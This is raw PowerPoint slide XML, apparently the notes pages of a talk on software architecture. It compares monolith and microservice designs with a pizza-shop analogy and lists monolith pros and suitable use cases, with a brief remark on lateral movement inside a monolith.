        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10918028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8BAF8-3D7A-2E6E-8364-AE02F2620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D2A46-00FC-C313-9CD9-AFDBF082D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C5CED-C442-1290-C8DC-DBE5992CEC23}"/>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7B6761CF-4B0D-E9CE-462D-E9F3B642D28E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>58</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12983616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A707C-BC3B-B0A6-8511-AC0AE13BA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AD9B8-6386-EF35-76A5-96811ACFA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2CEBF-2ADB-E51E-926B-3EE653A70077}"/>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370DE51E-2DCE-F4D9-16DD-5281429868B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>59</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4046692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2FAF-17E6-EB4B-6D22-166514E58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AEAE9-8106-F0B9-624A-AEFABD8B4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34859-A010-6DDB-90BE-EBAA112BE6BE}"/>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2B06CB6C-25E4-C073-6E08-746219BF1D42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>60</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37913856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EFFB3-58BB-3F3E-E840-6AB5521AB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BF407-2C7C-2D57-027E-F89FDA55C7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79AED-2E00-901D-3DDF-42D5DB9E3BFE}"/>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359F1A09-7190-5A2E-FDF2-E8CB8A69F8D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>61</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4224958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3994-FE2E-91AD-048B-56FFDCB6B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AF9AF-A68E-1825-62CE-89F86EC2C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355FF-CC64-C8B1-6EE9-1A855E4B67D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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7FEA1458-9A7B-EA2E-7A31-DA9FC2FCFA91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>62</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38505356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EF2FE-B364-6903-A663-F334D0B17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DC33C-CCBD-B9BF-57BD-2FE3C1DD0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DED12-BA03-4B8B-B26A-CF033C199AC8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Say you run a small pizza shop:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Monolith:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t> One cook does dough, toppings, oven, delivery calls. Fast to start, low cost, easy to navigate single control-point. Restaurant becomes more popular, when Friday night hits, the single station becomes a bottleneck.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Pros</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Simple release train:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> one pipeline, one artifact; fewer moving parts.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">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rPr>
              <a:t>Straightforward debugging:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> one place to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>look;stack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> traces end where they start.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">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rPr>
              <a:t>Resource efficiency:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> one app </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>perVM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/container layer; fewer inter-service hops.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">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rPr>
              <a:t>Lower infra tax:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> simpler networking, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TLS,discovery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, config, and secret management.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">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rPr>
              <a:t>Uniform patching</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: one place to update </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TLSlibs,frameworks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Great for:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Early-stage products or MVPs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>internal tools where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>speed of building</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> matters more than perfect scaling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Small teams &amp; low ops headcount</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8DB397D7-517C-6C0D-DDB7-F357D820D436}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>64</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15362936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F9636-C367-B63B-D8E2-349873B77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B49D2-DC87-165F-E950-F412B6A66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AE39A-CC33-010B-6D50-72D7A24FF499}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A01DFAFB-970F-6BF1-EB62-4BA710AD63D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>65</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27651756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F840B-2EDC-D58B-DB61-84DA30B9F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80614-0C2B-BC7A-1144-2BF2AB267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14ED9-4604-3170-4305-E0876084F914}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5F8184B-6B8C-2655-1866-21E02E9A5845}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>66</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11865144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AAD9-0A80-81DE-00C9-B58AACC0E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8D5B5-55E6-0456-2A1D-A38EAD75E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0C7186-B355-DF40-8BD2-F5850F18F4EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76E7922E-9CBD-EEA4-B193-A4283B623543}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>67</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9071886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1E808-9DDA-0FF3-BBD0-8574492B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98879-CA76-7C4D-E8C8-B714E6EBD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980C-66CE-AFA3-1A8A-5734D34398F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B4E0A60-EFF5-A415-0B6C-9EF4D348BC65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>68</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19931694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99B3-BAB5-AB5B-132D-52DE63BAC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F467A-3F1B-9B88-C026-B13403F49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03887-B19B-34F5-6E3D-57628A89BEC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lateral movement is trivial because there’s nowhere “else” to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>pivot—everything’s already inside.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{25B1F7D1-AD87-2916-2106-59A00C2F0A8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>69</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34773659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83A89-D291-BA57-D8A2-9F307DA7E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27F41-878C-BC86-BD8C-646A89AF3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EA7D3-49E8-E2A3-BA64-B6F5C23B9AD2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lateral movement is trivial because there’s nowhere “else” to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>pivot—everything’s already inside.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{553D450E-A7B3-E5AC-C32D-4787B0313B70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>70</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22408234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76DC0-E89B-F3CC-F4C5-AB5F41076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6ABD4-CB50-4AFE-A18B-83CAE42AE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931A6-9DD0-F337-E17D-1E643BBC50F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Basically, the greatest strength and weakness of monolith architecture is that everything is touching</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{963DA240-3396-4945-7477-ECB8783630E6}"/>
              </a:ext>
